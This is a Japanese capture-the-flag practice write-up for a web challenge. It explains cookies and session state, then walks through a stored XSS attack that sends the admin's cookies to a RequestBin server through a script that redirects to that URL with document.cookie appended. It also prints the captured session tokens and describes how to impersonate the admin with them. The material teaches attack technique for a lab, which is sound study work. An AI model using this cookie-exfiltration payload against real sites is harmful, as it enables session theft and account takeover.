# なし(練習問題)
## (ctf4b)
## web
***

始めにURLにアクセスする。  
そのURLでまずXSSの脆弱性がないか確かめるため、以下のコマンドを入力する。  
> <script>alert(1);</script>
これを入力して、アラートがでると、XSSの脆弱性が存在しているということになる。今回はこの脆弱性に対して攻撃を仕掛ける。  

セッションハイジャックを理解するためには、ステート管理という概念を知る必要がある。  
ステートとは内部状態のことを指し、以前の状態を記憶しているかしていないかという考えのことをいう。  
例えば今日のごはんを何にするか考える時、ステート有の場合は、昨日のごはんについて覚えているため、昨日はカレーだったから今日はかつ丼にするか、みたいに考えるが、ステート無しの場合、昨日のご飯を覚えていないため、昨日のごはんがカレーであっても、平気で今日のごはんをカレーにする。  

次にHTTPのステート管理について  
HTTPはステートを管理する仕組みがないため、AさんBさんCさんがリクエストを送った場合、どのリクエストがだれからのものか判別することが出来ない。これを解決するためにCokkieというものが用いられる。  

始めにサーバにアクセスした際、リクエストにCokkieが含まれていなければそのリクエスト元に対してCookieを生成する。次からこのユーザはCookieをリクエストに加えることで、自分が誰なのか示すことができる。  
例えば、ＡさんにはAAAというCookieを、BさんにはBBBというCookieを渡しておけば、Cookieの情報をみてAAAならこのリクエストはＡさんからのものだな、BBBならＢさんからだなとわかる。  

セッションハイジャック  
つまり、第三者にCookieの情報が漏れた場合、その人がなりすましをすることが出来るということになる。例えば、BBBというCookieがCさんの元に渡った場合、CさんはBさんのふりをしてサーバにリクエストを送ることが出来る。これをセッションハイジャックという。  

今回はXSSでセッションハイジャックを仕掛ける。  

攻撃は以下の流れで行う。
1-Adminに対してスクリプトを仕込んだメッセージを送信
2-Cookieの中身を取得するスクリプトがAdminアカウントで実行される
3-外部のWebサーバにその内容が送信される
4-取得した内容を自分のCookieに転写する
5-この状態でアクセスする

AdminのCookieを外部サーバに送る必要があるため、簡易的にHTTPサーバが構築できるサービスRequestBinを使用する。  

https://requestbin.com/にアクセスし、Create Request Binの下にある小さなpublic binという文字をクリックする。  

すると簡易サーバが用意できたため、試しに生成出来たURLにアクセスしてみる。  
{"success":true}と表示されれば成功している。  

次に実際の攻撃を仕掛ける。攻撃の際はURLの後ろにCookieをクエリとして送信するようにすればいいため、jsでhttps://<<発行されたURL>>/?q=' + document.cookieのようなURLにアクセスさせることが目標  

実際の攻撃スクリプト
> <script>window.location.href='作成したサーバのURL?q='+document.cookie</script>

最後のdocument.cookieでAdminのクッキーを取得し、それを記述したURLに送信するようにする。
これにより、以下のような値が返ってくる。
```
remember_token=Admin|c613e309359f16f353174bf40c5877fef102ff855621eb77673ef341970ddce18d4f674d7785f527dc194f2b1cac34f7430001f2a786b9d270e4ca8efb7cd3d4;%20session=.eJwlzjsOwjAMANC7ZGaIk_iTbpyksmNHdIChpRPi7lTiAE96n7TOPY5HWt77Gbe0bp6WZCDCdXCgd2crWKDmQYRTiWxASJkSjqAOzGEdZbA7iU3RCJEqDtF0UrXLS6g0DDMnBO5tZtGKzVpAC2uluNUc0sMKKXLWdEXOI_b_5u7P7ZW-P9UHMgA.YSTebQ.7qbYyhTS3LkHgVBJDLK4rP390NI
```

見やすくするとこう
```
remember_token=Admin|c613e309359f16f353174bf40c5877fef102ff855621eb77673ef341970ddce18d4f674d7785f527dc194f2b1cac34f7430001f2a786b9d270e4ca8efb7cd3d4;
session=.eJwlzjsOwjAMANC7ZGaIk_iTbpyksmNHdIChpRPi7lTiAE96n7TOPY5HWt77Gbe0bp6WZCDCdXCgd2crWKDmQYRTiWxASJkSjqAOzGEdZbA7iU3RCJEqDtF0UrXLS6g0DDMnBO5tZtGKzVpAC2uluNUc0sMKKXLWdEXOI_b_5u7P7ZW-P9UHMgA.YSTebQ.7qbYyhTS3LkHgVBJDLK4rP390NI
```

こんなかんじでremenber_tokenとsessionというcookieが返ってきていることが分かる。これでcookieの値はわかったため、実際にAdminになりすましセッションハイジャックを仕掛ける。  

webサイトを開く->デベロッパーツール起動(F12)->上の方からApplicationを選択->Storage->Cookiesとすると中にsessionとremenber_tokenという名前のcookieが入っていることが分かる。後はこれをAdminのものに変えてやればいいので、先ほど取得したcookieをそれぞれの名前を確認して、正しい方へ入力する。この際あらかじめ書かれてあるcookieの値は完全に消す。

書き換えが完了したら、ページをリロードする。すると上の方に受信したメッセージのところがめっちゃ増えており、上の方にフラグが出ているため、セッションハイジャックは成功。現在表示されているのはAdminのページであることが分かる。